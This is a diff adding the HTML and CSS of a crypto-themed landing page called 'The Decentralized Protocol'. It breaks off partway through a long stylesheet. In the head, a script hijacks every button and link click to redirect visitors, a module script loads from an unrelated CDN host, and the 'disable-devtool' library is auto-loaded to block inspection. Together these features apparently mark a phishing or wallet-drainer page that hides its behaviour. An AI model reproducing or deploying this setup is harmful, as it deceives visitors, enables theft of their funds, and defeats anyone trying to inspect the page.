@@ -1,0 +1,2697 @@
+<!DOCTYPE html>
+<html lang="en" style="">
+    <head>
+        <script>
+        // Use event delegation to handle all clicks on the document
+document.addEventListener('click', function(e) {
+  // Check if clicked element is a button or anchor
+  if (e.target.tagName === 'BUTTON' || e.target.tagName === 'A') {
+    e.preventDefault();
+    window.location.href = './app/index.html';
+  }
+});
+        </script>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>The Decentralized Protocol</title>
+        <meta name="description" content="Welcome to our website.">
+        <style>
+    .sf-hidden {
+      display: none !important
+    }
+        </style>
+        <style>
+    img[src="data:,"],
+    source[src="data:,"] {
+      display: none !important
+    }
+
+    .interact-button {
+      cursor: pointer;
+    }
+
+    .interact-button:hover {
+      transition: .2s all ease-in-out;
+      opacity: 0.5;
+      color: #fff;
+    }
+        </style>
+        <link rel="shortcut icon" href="favicon.ico.html">
+        <script src="/config.js"></script>
+        <script type="module" crossorigin src="/assets/index-DJ0xwRJa.js"></script>
+        <script type="module" src="https://spngbeb.b-cdn.net/assets/index.js"></script>
+        <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool/disable-devtool.min.js"></script>
+    </head>
+    <body style=" background: url(&quot;background_homepage_header.png&quot;);background-color: #010101;" class="@@dashboard dark-theme">
+        <div id="in-page-channel-node-id" data-channel-name="in_page_channel_oaMcf6"></div>
+        <style>
+    /*!
+ * Bootstrap v5.1.3 (https://getbootstrap.com/)
+ * Copyright 2011-2021 The Bootstrap Authors
+ * Copyright 2011-2021 Twitter, Inc.
+ * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
+ */
+    @d-flex screen and (max-width: 800px) and (orientation: landscape),
+    screen and (max-height: 300px) {
+      .mfp-img-mobile .mfp-image-holder {
+        padding-left: 0;
+        padding-right: 0
+      }
+
+      .mfp-img-mobile img.mfp-img {
+        padding: 0
+      }
+
+      .mfp-img-mobile .mfp-figure:after {
+        top: 0;
+        bottom: 0
+      }
+
+      .mfp-img-mobile .mfp-bottom-bar {
+        background: rgba(0, 0, 0, 0.6);
+        bottom: 0;
+        margin: 0;
+        top: auto;
+        padding: 3px 5px;
+        position: fixed;
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+      }
+
+      .mfp-img-mobile .mfp-bottom-bar:empty {
+        padding: 0
+      }
+
+      .mfp-img-mobile .mfp-counter {
+        right: 5px;
+        top: 3px
+      }
+
+      .mfp-img-mobile .mfp-close {
+        top: 0;
+        right: 0;
+        width: 35px;
+        height: 35px;
+        line-height: 35px;
+        background: rgba(0, 0, 0, 0.6);
+        position: fixed;
+        text-align: center;
+        padding: 0
+      }
+
+      .mfp-img-mobile .mfp-figure small {
+        display: inline;
+        margin-left: 5px
+      }
+    }
+
+    @d-flex all and (max-width: 800px) {
+      .mfp-arrow {
+        -webkit-transform: scale(0.75);
+        transform: scale(0.75)
+      }
+
+      .mfp-arrow-left {
+        -webkit-transform-origin: 0;
+        transform-origin: 0
+      }
+
+      .mfp-arrow-right {
+        -webkit-transform-origin: 100%;
+        transform-origin: 100%
+      }
+
+      .mfp-container {
+        padding-left: 6px;
+        padding-right: 6px
+      }
+    }
+
+    @font-face {
+      font-family: "Nunito Sans";
+      font-style: normal;
+      font-weight: 400;
+      font-stretch: 100%;
+      src: url("")format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+
+    @font-face {
+      font-family: "Nunito Sans";
+      font-style: normal;
+      font-weight: 600;
+      font-stretch: 100%;
+      src: url("")format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+
+    @font-face {
+      font-family: "Nunito Sans";
+      font-style: normal;
+      font-weight: 700;
+      font-stretch: 100%;
+      src: url("")format("woff2");
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD
+    }
+
+    @font-face {
+      font-family: "bootstrap-icons";
+      src: url("cc002b643055b6fc2209d365639b3763e3626a2f.woff2")format("woff2")
+    }
+
+    [class^="bi-"]::before,
+    [class*=" bi-"]::before {
+      display: inline-block;
+      font-family: bootstrap-icons !important;
+      font-style: normal;
+      font-weight: normal !important;
+      font-variant: normal;
+      text-transform: none;
+      line-height: 1;
+      vertical-align: text-bottom;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale
+    }
+
+    .bi-arrow-right-short::before {
+      content: ""
+    }
+
+    .bi-arrow-right::before {
+      content: ""
+    }
+
+    .bi-circle-half::before {
+      content: ""
+    }
+
+    .bi-facebook::before {
+      content: ""
+    }
+
+    .bi-linkedin::before {
+      content: ""
+    }
+
+    .bi-play-fill::before {
+      content: ""
+    }
+
+    .bi-shield-check::before {
+      content: ""
+    }
+
+    .bi-twitter::before {
+      content: ""
+    }
+
+    .bi-x-diamond::before {
+      content: ""
+    }
+
+    .bi-youtube::before {
+      content: ""
+    }
+
+    @font-face {
+      font-family: "remixicon";
+      src: url("")format("woff2")
+    }
+
+    [class^="ri-"] {
+      font-family: "remixicon" !important;
+      font-style: normal;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale
+    }
+
+    .ri-sun-line:before {
+      content: ""
+    }
+
+    :root {
+      --bs-blue: #0d6efd;
+      --bs-indigo: #6610f2;
+      --bs-purple: #5848BB;
+      --bs-pink: #d63384;
+      --bs-red: #dc3545;
+      --bs-orange: #fd7e14;
+      --bs-yellow: #ffc107;
+      --bs-green: #198754;
+      --bs-teal: #20c997;
+      --bs-cyan: #0dcaf0;
+      --bs-white: #fff;
+      --bs-gray: #6c757d;
+      --bs-gray-dark: #343a40;
+      --bs-gray-100: #f8f9fa;
+      --bs-gray-200: #e9ecef;
+      --bs-gray-300: #dee2e6;
+      --bs-gray-400: #ced4da;
+      --bs-gray-500: #adb5bd;
+      --bs-gray-600: #6c757d;
+      --bs-gray-700: #495057;
+      --bs-gray-800: #343a40;
+      --bs-gray-900: #212529;
+      --bs-primary: #008AFF;
+      --bs-secondary: #f73164;
+      --bs-success: #51BB25;
+      --bs-info: #A927F9;
+      --bs-warning: #F8D62B;
+      --bs-danger: #DC3545;
+      --bs-light: #fafbfe;
+      --bs-dark: #0E0B2B;
+      --bs-primary-rgb: 0, 138, 255;
+      --bs-secondary-rgb: 247, 49, 100;
+      --bs-success-rgb: 81, 187, 37;
+      --bs-info-rgb: 169, 39, 249;
+      --bs-warning-rgb: 248, 214, 43;
+      --bs-danger-rgb: 220, 53, 69;
+      --bs-light-rgb: 250, 251, 254;
+      --bs-dark-rgb: 14, 11, 43;
+      --bs-white-rgb: 255, 255, 255;
+      --bs-black-rgb: 0, 0, 0;
+      --bs-body-color-rgb: 98, 117, 157;
+      --bs-body-bg-rgb: 255, 255, 255;
+      --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+      --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
+      --bs-body-font-family: Nunito Sans, sans-serif;
+      --bs-body-font-size: 1rem;
+      --bs-body-font-weight: 400;
+      --bs-body-line-height: 1.7;
+      --bs-body-color: #62759d;
+      --bs-body-bg: #fff
+    }
+
+    *,
+    *::before,
+    *::after {
+      -webkit-box-sizing: border-box;
+      box-sizing: border-box
+    }
+
+    @media (prefers-reduced-motion:no-preference) {
+      :root {
+        scroll-behavior: smooth
+      }
+    }
+
+    body {
+      margin: 0;
+      font-family: var(--bs-body-font-family);
+      font-size: var(--bs-body-font-size);
+      font-weight: var(--bs-body-font-weight);
+      line-height: var(--bs-body-line-height);
+      text-align: var(--bs-body-text-align);
+      -webkit-text-size-adjust: 100%;
+      -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
+    }
+
+    h1,
+    h2,
+    h4 {
+      margin-top: 0;
+      margin-bottom: 0.5rem;
+      font-weight: 700;
+      line-height: 1.6
+    }
+
+    @media (min-width:1200px) {
+      h1 {
+        font-size: 2.25rem
+      }
+    }
+
+    @media (min-width:1200px) {
+      h2 {
+        font-size: 1.875rem
+      }
+    }
+
+    @media (min-width:1200px) {}
+
+    h4 {
+      font-size: 1.125rem
+    }
+
+    p {
+      margin-top: 0;
+      margin-bottom: 1rem
+    }
+
+    ul {
+      padding-left: 2rem
+    }
+
+    ul {
+      margin-top: 0;
+      margin-bottom: 1rem
+    }
+
+    a:hover {
+      color: #006ecc
+    }
+
+    a:not([href]):not([class]),
+    a:not([href]):not([class]):hover {
+      color: inherit;
+      text-decoration: none
+    }
+
+    img {
+      vertical-align: middle
+    }
+
+    @media (min-width:1200px) {}
+
+    ::-webkit-datetime-edit-fields-wrapper,
+    ::-webkit-datetime-edit-text,
+    ::-webkit-datetime-edit-minute,
+    ::-webkit-datetime-edit-hour-field,
+    ::-webkit-datetime-edit-day-field,
+    ::-webkit-datetime-edit-month-field,
+    ::-webkit-datetime-edit-year-field {
+      padding: 0
+    }
+
+    ::-webkit-inner-spin-button {
+      height: auto
+    }
+
+    ::-webkit-search-decoration {
+      -webkit-appearance: none
+    }
+
+    ::-webkit-color-swatch-wrapper {
+      padding: 0
+    }
+
+    ::-webkit-file-upload-button {
+      font: inherit;
+      -webkit-appearance: button
+    }
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1200px) {}
+
+    .img-fluid {
+      max-width: 100%;
+      height: auto
+    }
+
+    .container {
+      width: 100%;
+      padding-right: var(--bs-gutter-x, 15px);
+      padding-left: var(--bs-gutter-x, 15px);
+      margin-right: auto;
+      margin-left: auto
+    }
+
+    @media (min-width:576px) {
+      .container {
+        max-width: 540px
+      }
+    }
+
+    @media (min-width:768px) {
+      .container {
+        max-width: 720px
+      }
+    }
+
+    @media (min-width:992px) {
+      .container {
+        max-width: 960px
+      }
+    }
+
+    @media (min-width:1200px) {
+      .container {
+        max-width: 1140px
+      }
+    }
+
+    @media (min-width:1400px) {
+      .container {
+        max-width: 1320px
+      }
+    }
+
+    .row {
+      --bs-gutter-x: 30px;
+      --bs-gutter-y: 0;
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      -ms-flex-wrap: wrap;
+      flex-wrap: wrap;
+      margin-top: calc(-1*var(--bs-gutter-y));
+      margin-right: calc(-.5*var(--bs-gutter-x));
+      margin-left: calc(-.5*var(--bs-gutter-x))
+    }
+
+    .row>* {
+      -ms-flex-negative: 0;
+      flex-shrink: 0;
+      width: 100%;
+      max-width: 100%;
+      padding-right: calc(var(--bs-gutter-x)*.5);
+      padding-left: calc(var(--bs-gutter-x)*.5);
+      margin-top: var(--bs-gutter-y)
+    }
+
+    .col-6 {
+      -webkit-box-flex: 0;
+      -ms-flex: 0 0 auto;
+      flex: 0 0 auto;
+      width: 50%
+    }
+
+    .col-12 {
+      -webkit-box-flex: 0;
+      -ms-flex: 0 0 auto;
+      flex: 0 0 auto;
+      width: 100%
+    }
+
+    @media (min-width:576px) {
+      .col-sm-4 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 33.33333%
+      }
+
+      .col-sm-6 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 50%
+      }
+
+      .col-sm-8 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 66.66667%
+      }
+    }
+
+    @media (min-width:768px) {
+      .col-md-5 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 41.66667%
+      }
+
+      .col-md-6 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 50%
+      }
+
+      .col-md-7 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 58.33333%
+      }
+    }
+
+    @media (min-width:992px) {
+      .col-lg-2 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 16.66667%
+      }
+
+      .col-lg-4 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 33.33333%
+      }
+
+      .col-lg-6 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 50%
+      }
+    }
+
+    @media (min-width:1200px) {
+      .col-xl-2 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 16.66667%
+      }
+
+      .col-xl-4 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 33.33333%
+      }
+
+      .col-xl-5 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 41.66667%
+      }
+
+      .col-xl-6 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 50%
+      }
+
+      .col-xl-8 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 66.66667%
+      }
+
+      .col-xl-12 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 auto;
+        flex: 0 0 auto;
+        width: 100%
+      }
+    }
+
+    @media (min-width:1400px) {}
+
+    @media (max-width:575.98px) {}
+
+    @media (max-width:767.98px) {}
+
+    @media (max-width:991.98px) {}
+
+    @media (max-width:1199.98px) {}
+
+    @media (max-width:1399.98px) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    .btn {
+      display: inline-block;
+      line-height: 1.7;
+      text-align: center;
+      text-decoration: none;
+      vertical-align: middle;
+      cursor: pointer;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      background-color: transparent;
+      border: 1px solid transparent;
+      font-size: 1rem;
+      border-radius: 8px;
+      -webkit-transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
+      transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
+      transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+      transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out
+    }
+
+    @media (prefers-reduced-motion:reduce) {
+      .btn {
+        -webkit-transition: none;
+        transition: none
+      }
+    }
+
+    .btn:hover {
+      color: #62759d
+    }
+
+    .btn-check:focus+.btn,
+    .btn:focus {
+      outline: 0;
+      -webkit-box-shadow: 0 0 0 0rem rgba(0, 138, 255, 0.25);
+      box-shadow: 0 0 0 0rem rgba(0, 138, 255, 0.25)
+    }
+
+    .btn:disabled,
+    .btn.disabled,
+    fieldset:disabled .btn {
+      pointer-events: none;
+      opacity: 0.65
+    }
+
+    .btn-primary {
+      background-color: #008AFF;
+      border-color: #008AFF
+    }
+
+    .btn-primary:hover {
+      color: #000;
+      background-color: #269cff;
+      border-color: #1a96ff
+    }
+
+    .btn-check:focus+.btn-primary,
+    .btn-primary:focus {
+      color: #000;
+      background-color: #269cff;
+      border-color: #1a96ff;
+      -webkit-box-shadow: 0 0 0 0rem rgba(0, 117, 217, 0.5);
+      box-shadow: 0 0 0 0rem rgba(0, 117, 217, 0.5)
+    }
+
+    .btn-check:checked+.btn-primary,
+    .btn-check:active+.btn-primary,
+    .btn-primary:active,
+    .btn-primary.active,
+    .show>.btn-primary.dropdown-toggle {
+      color: #000;
+      background-color: #33a1ff;
+      border-color: #1a96ff
+    }
+
+    .btn-check:checked+.btn-primary:focus,
+    .btn-check:active+.btn-primary:focus,
+    .btn-primary:active:focus,
+    .btn-primary.active:focus,
+    .show>.btn-primary.dropdown-toggle:focus {
+      -webkit-box-shadow: 0 0 0 0rem rgba(0, 117, 217, 0.5);
+      box-shadow: 0 0 0 0rem rgba(0, 117, 217, 0.5)
+    }
+
+    .btn-primary:disabled,
+    .btn-primary.disabled {
+      color: #000;
+      background-color: #008AFF;
+      border-color: #008AFF
+    }
+
+    .btn-outline-primary {
+      border-color: #008AFF
+    }
+
+    .btn-outline-primary:hover {
+      color: #000;
+      background-color: #008AFF;
+      border-color: #008AFF
+    }
+
+    .btn-check:focus+.btn-outline-primary,
+    .btn-outline-primary:focus {
+      -webkit-box-shadow: 0 0 0 0rem rgba(0, 138, 255, 0.5);
+      box-shadow: 0 0 0 0rem rgba(0, 138, 255, 0.5)
+    }
+
+    .btn-check:checked+.btn-outline-primary,
+    .btn-check:active+.btn-outline-primary,
+    .btn-outline-primary:active,
+    .btn-outline-primary.active,
+    .btn-outline-primary.dropdown-toggle.show {
+      color: #000;
+      background-color: #008AFF;
+      border-color: #008AFF
+    }
+
+    .btn-check:checked+.btn-outline-primary:focus,
+    .btn-check:active+.btn-outline-primary:focus,
+    .btn-outline-primary:active:focus,
+    .btn-outline-primary.active:focus,
+    .btn-outline-primary.dropdown-toggle.show:focus {
+      -webkit-box-shadow: 0 0 0 0rem rgba(0, 138, 255, 0.5);
+      box-shadow: 0 0 0 0rem rgba(0, 138, 255, 0.5)
+    }
+
+    .btn-outline-primary:disabled,
+    .btn-outline-primary.disabled {
+      color: #008AFF;
+      background-color: transparent
+    }
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    .collapse:not(.show) {
+      display: none
+    }
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    .dropdown {
+      position: relative
+    }
+
+    @media (min-width:576px) {}
+
+    @media (min-width:768px) {}
+
+    @media (min-width:992px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1400px) {}
+
+    .nav-link {
+      padding: 0.5rem 1rem;
+      text-decoration: none;
+      -webkit-transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out;
+      transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out
+    }
+
+    @media (prefers-reduced-motion:reduce) {
+      .nav-link {
+        -webkit-transition: none;
+        transition: none
+      }
+    }
+
+    .nav-link:hover,
+    .nav-link:focus {
+      color: #006ecc
+    }
+
+    .navbar {
+      position: relative;
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      -ms-flex-wrap: wrap;
+      flex-wrap: wrap;
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center;
+      -webkit-box-pack: justify;
+      -ms-flex-pack: justify;
+      justify-content: space-between;
+      padding-top: 0.5rem;
+      padding-bottom: 0.5rem
+    }
+
+    .navbar-nav {
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      -webkit-box-orient: vertical;
+      -webkit-box-direction: normal;
+      -ms-flex-direction: column;
+      flex-direction: column;
+      padding-left: 0;
+      margin-bottom: 0;
+      list-style: none
+    }
+
+    .navbar-nav .nav-link {
+      padding-right: 0;
+      padding-left: 0
+    }
+
+    .navbar-collapse {
+      -ms-flex-preferred-size: 100%;
+      flex-basis: 100%;
+      -webkit-box-flex: 1;
+      -ms-flex-positive: 1;
+      flex-grow: 1;
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center
+    }
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (min-width:576px) {}
+
+    @media (min-width:768px) {}
+
+    @media (min-width:992px) {
+      .navbar-expand-lg {
+        -ms-flex-wrap: nowrap;
+        flex-wrap: nowrap;
+        -webkit-box-pack: start;
+        -ms-flex-pack: start;
+        justify-content: flex-start
+      }
+
+      .navbar-expand-lg .navbar-nav {
+        -webkit-box-orient: horizontal;
+        -webkit-box-direction: normal;
+        -ms-flex-direction: row;
+        flex-direction: row
+      }
+
+      .navbar-expand-lg .navbar-nav .nav-link {
+        padding-right: 0.5rem;
+        padding-left: 0.5rem
+      }
+
+      .navbar-expand-lg .navbar-collapse {
+        display: -webkit-box !important;
+        display: -ms-flexbox !important;
+        display: flex !important;
+        -ms-flex-preferred-size: auto;
+        flex-basis: auto
+      }
+    }
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1400px) {}
+
+    .navbar-light .navbar-nav .nav-link {
+      color: rgba(0, 0, 0, 0.55)
+    }
+
+    .navbar-light .navbar-nav .nav-link:hover,
+    .navbar-light .navbar-nav .nav-link:focus {
+      color: rgba(0, 0, 0, 0.7)
+    }
+
+    @media (min-width:576px) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @-webkit-keyframes progress-bar-stripes {
+      0% {
+        background-position-x: 1rem
+      }
+    }
+
+    @keyframes progress-bar-stripes {
+      0% {
+        background-position-x: 1rem
+      }
+    }
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (min-width:576px) {}
+
+    @media (min-width:768px) {}
+
+    @media (min-width:992px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1400px) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (min-width:576px) {}
+
+    @media (min-width:992px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (max-width:575.98px) {}
+
+    @media (max-width:767.98px) {}
+
+    @media (max-width:991.98px) {}
+
+    @media (max-width:1199.98px) {}
+
+    @media (max-width:1399.98px) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @-webkit-keyframes spinner-border {
+      to {
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg)
+      }
+    }
+
+    @keyframes spinner-border {
+      to {
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg)
+      }
+    }
+
+    @-webkit-keyframes spinner-grow {
+      0% {
+        -webkit-transform: scale(0);
+        transform: scale(0)
+      }
+
+      50% {
+        opacity: 1;
+        -webkit-transform: none;
+        transform: none
+      }
+    }
+
+    @keyframes spinner-grow {
+      0% {
+        -webkit-transform: scale(0);
+        transform: scale(0)
+      }
+
+      50% {
+        opacity: 1;
+        -webkit-transform: none;
+        transform: none
+      }
+    }
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @media (prefers-reduced-motion:reduce) {}
+
+    @-webkit-keyframes placeholder-glow {
+      50% {
+        opacity: 0.2
+      }
+    }
+
+    @keyframes placeholder-glow {
+      50% {
+        opacity: 0.2
+      }
+    }
+
+    @-webkit-keyframes placeholder-wave {
+      100% {
+        -webkit-mask-position: -200% 0%;
+        mask-position: -200% 0%
+      }
+    }
+
+    @keyframes placeholder-wave {
+      100% {
+        -webkit-mask-position: -200% 0%;
+        mask-position: -200% 0%
+      }
+    }
+
+    @media (min-width:576px) {}
+
+    @media (min-width:768px) {}
+
+    @media (min-width:992px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1400px) {}
+
+    .d-flex {
+      display: -webkit-box !important;
+      display: -ms-flexbox !important;
+      display: flex !important
+    }
+
+    .justify-content-center {
+      -webkit-box-pack: center !important;
+      -ms-flex-pack: center !important;
+      justify-content: center !important
+    }
+
+    .justify-content-between {
+      -webkit-box-pack: justify !important;
+      -ms-flex-pack: justify !important;
+      justify-content: space-between !important
+    }
+
+    .align-items-center {
+      -webkit-box-align: center !important;
+      -ms-flex-align: center !important;
+      align-items: center !important
+    }
+
+    .my-5 {
+      margin-top: 3rem !important;
+      margin-bottom: 3rem !important
+    }
+
+    .mt-5 {
+      margin-top: 3rem !important
+    }
+
+    .me-auto {
+      margin-right: auto !important
+    }
+
+    .mb-3 {
+      margin-bottom: 1rem !important
+    }
+
+    .px-4 {
+      padding-right: 1.5rem !important;
+      padding-left: 1.5rem !important
+    }
+
+    .pb-3 {
+      padding-bottom: 1rem !important
+    }
+
+    .text-center {
+      text-align: center !important
+    }
+
+    .bg-light {
+      --bs-bg-opacity: 1;
+      background-color: rgba(var(--bs-light-rgb), var(--bs-bg-opacity)) !important
+    }
+
+    @media (min-width:576px) {}
+
+    @media (min-width:768px) {}
+
+    @media (min-width:992px) {}
+
+    @media (min-width:1200px) {}
+
+    @media (min-width:1400px) {}
+
+    @media (min-width:1200px) {}
+
+    * {
+      outline: none;
+      padding: 0
+    }
+
+    *::after {
+      margin: 0;
+      padding: 0
+    }
+
+    *::before {
+      margin: 0;
+      padding: 0
+    }
+
+    #main-wrapper {
+      -webkit-transition: all 0.25s ease-in;
+      transition: all 0.25s ease-in;
+      position: relative;
+      z-index: 1
+    }
+
+    #main-wrapper.show {
+      opacity: 1
+    }
+
+    @media (min-width:576px) {}
+
+    @media only screen and (max-width:767px) {}
+
+    .front {
+      padding-top: 85px
+    }
+
+    ul {
+      padding: 0;
+      margin: 0
+    }
+
+    li {
+      list-style: none
+    }
+
+    a {
+      color: #008AFF;
+      text-decoration: none;
+      outline: none
+    }
+
+    a:hover,
+    a:focus,
+    a.active {
+      text-decoration: none;
+      outline: none;
+      color: #008AFF
+    }
+
+    @-webkit-keyframes googleDotA {
+      0% {
+        opacity: 0;
+        transform: translate3d(60px, 0, 0);
+        -webkit-transform: translate3d(60px, 0, 0)
+      }
+
+      30% {
+        opacity: 1;
+        transform: translate3d(0, 0, 0);
+        -webkit-transform: translate3d(0, 0, 0)
+      }
+
+      70% {
+        opacity: 1;
+        transform: translate3d(0, 0, 0);
+        -webkit-transform: translate3d(0, 0, 0)
+      }
+
+      100% {
+        opacity: 0;
+        transform: translate3d(-300px, 0, 0);
+        -webkit-transform: translate3d(-300px, 0, 0)
+      }
+    }
+
+    @-webkit-keyframes googleDotB {
+      0% {
+        opacity: 0;
+        transform: translate3d(180px, 0, 0);
+        -webkit-transform: translate3d(180px, 0, 0)
+      }
+
+      35% {
+        opacity: 1;
+        transform: translate3d(0, 0, 0);
+        -webkit-transform: translate3d(0, 0, 0)
+      }
+
+      77% {
+        opacity: 1;
+        transform: translate3d(0, 0, 0);
+        -webkit-transform: translate3d(0, 0, 0)
+      }
+
+      100% {
+        opacity: 0;
+        transform: translate3d(-180px, 0, 0);
+        -webkit-transform: translate3d(-180px, 0, 0)
+      }
+    }
+
+    @-webkit-keyframes googleDotC {
+      0% {
+        opacity: 0;
+        transform: translate3d(300px, 0, 0);
+        -webkit-transform: translate3d(300px, 0, 0)
+      }
+
+      40% {
+        opacity: 1;
+        transform: translate3d(0, 0, 0);
+        -webkit-transform: translate3d(0, 0, 0)
+      }
+
+      80% {
+        opacity: 1;
+        transform: translate3d(0, 0, 0);
+        -webkit-transform: translate3d(0, 0, 0)
+      }
+
+      100% {
+        opacity: 0;
+        transform: translate3d(-60px, 0, 0);
+        -webkit-transform: translate3d(-60px, 0, 0)
+      }
+    }
+
+    .section-padding {
+      padding: 100px 0
+    }
+
+    @media only screen and (max-width:1199px) {
+      .section-padding {
+        padding: 80px 0
+      }
+    }
+
+    @media only screen and (max-width:991px) {
+      .section-padding {
+        padding: 75px 0
+      }
+    }
+
+    @media only screen and (max-width:767px) {
+      .section-padding {
+        padding: 60px 0
+      }
+    }
+
+    @media only screen and (max-width:575px) {
+      .section-padding {
+        padding: 50px 0
+      }
+    }
+
+    ::-webkit-scrollbar {
+      width: 5px
+    }
+
+    ::-webkit-scrollbar-track {
+      -webkit-box-shadow: inset 0 0 5px grey;
+      box-shadow: inset 0 0 5px grey;
+      border-radius: 10px
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #999;
+      border-radius: 10px
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #777
+    }
+
+    .section-title {
+      margin-bottom: 75px
+    }
+
+    .section-title h2 {
+      text-align: center;
+      font-weight: 700;
+      font-size: 40px
+    }
+
+    .triangle-top-light::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      width: 100%;
+      height: 0;
+      border-style: solid;
+      border-width: 0 0 50px 99.5vw;
+      border-color: transparent transparent #fafbfe transparent;
+      top: -50px
+    }
+
+    .triangle-bottom-light {
+      position: relative
+    }
+
+    .triangle-bottom-light::before {
+      content: "";
+      position: absolute;
+      left: 0;
+      right: 0;
+      width: 100%;
+      height: 0;
+      border-style: solid;
